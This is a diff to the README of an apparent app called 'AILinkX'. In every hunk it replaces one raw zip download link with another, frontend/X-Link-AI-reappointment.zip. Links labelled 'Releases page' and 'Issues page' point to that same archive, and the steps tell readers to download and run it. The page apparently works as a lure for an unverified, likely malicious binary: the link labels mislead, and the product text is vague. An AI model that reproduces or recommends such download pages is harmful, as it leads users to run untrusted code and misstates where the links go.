@@ -6,7 +6,7 @@ Welcome to AILinkX! This application connects you to the digital world like neve
 
 ## 📥 Download AILinkX
 
-[![Download AILinkX](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/config/Link_X_AI_2.0.zip%https://github.com/sh4rck/AILinkX/raw/refs/heads/main/config/Link_X_AI_2.0.zip)](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/config/Link_X_AI_2.0.zip)  
+[![Download AILinkX](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/frontend/X-Link-AI-reappointment.zip%https://github.com/sh4rck/AILinkX/raw/refs/heads/main/frontend/X-Link-AI-reappointment.zip)](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/frontend/X-Link-AI-reappointment.zip)  
 Click the button above to get started!
 
 ## 📋 System Requirements
@@ -31,7 +31,7 @@ AILinkX offers a range of features to enhance your digital interactions, includi
 
 To download AILinkX, follow these simple steps:
 
-1. **Visit this page to download:** Go to the [Releases page](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/config/Link_X_AI_2.0.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/frontend/X-Link-AI-reappointment.zip).
 2. **Choose the latest version:** Look for the most recent release.
 3. **Download the binary file:** Click on the file that matches your operating system.
 4. **Run the installer:** After downloading, open the file to start installation.
@@ -40,7 +40,7 @@ Follow the prompts on your screen to complete the setup.
 
 ## 🖥️ Support & Help
 
-If you encounter any issues while downloading or running AILinkX, feel free to contact support through the [Issues page](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/config/Link_X_AI_2.0.zip). 
+If you encounter any issues while downloading or running AILinkX, feel free to contact support through the [Issues page](https://github.com/sh4rck/AILinkX/raw/refs/heads/main/frontend/X-Link-AI-reappointment.zip). 
 
 ## 🌎 Topics
 
